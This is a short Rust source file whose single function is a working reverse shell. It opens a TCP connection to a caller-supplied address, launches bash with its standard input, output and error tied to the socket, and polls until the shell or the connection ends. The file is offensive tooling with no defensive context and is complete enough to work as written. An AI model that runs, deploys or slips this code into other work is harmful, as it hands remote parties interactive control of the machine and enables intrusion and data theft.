use std::net::{Shutdown, TcpStream};
use std::process::{Command, Stdio};
use std::thread::sleep;
use std::time::Duration;
use std::os::unix::io::{AsRawFd, FromRawFd};

pub fn shell(addr: &str)
{
    println!("[+] connecting to host...");
        
    /* connect to host and port */
    let stream = TcpStream::connect(addr)
        .expect("connection failed");

    println!("[+] connected");
    
    let mut proc = Command::new("bash");

    println!("[+] creating shell");

    /* redirect stdin to socket
     * redirect stdout/stderr to socket */
    proc.stdin(unsafe { Stdio::from_raw_fd(stream.as_raw_fd()) });
    proc.stdout(unsafe { Stdio::from_raw_fd(stream.as_raw_fd()) });
    proc.stderr(unsafe { Stdio::from_raw_fd(stream.as_raw_fd()) });

    println!("[+] using socket as file descriptors");
            
    /* launch shell */
    let mut child = proc.spawn().expect("spawn shell failed");

    println!("[+] spawned shell process");
    
    /* while running, check if socket is alive */
    loop {
        let result = child.try_wait();

        if result.is_err() {
            println!("[!] shell errored out");
            break;
        }
        else if result.is_ok() {
            let exit_code = result.unwrap();

            if exit_code.is_some() {
                println!("[!] shell exited ({:?})", exit_code);
                break;
            }
        }

        let mut peek_buffer = [0u8; 1];
        let peek = stream.peek(&mut peek_buffer);

        if peek.is_err() {
            println!("[!] socket failed");
            break;
        }

        sleep(Duration::from_secs(1));
    }

    println!("[+] shutting down");
    
    /* close socket */
    stream.shutdown(Shutdown::Both).expect("shutdown failed");
}
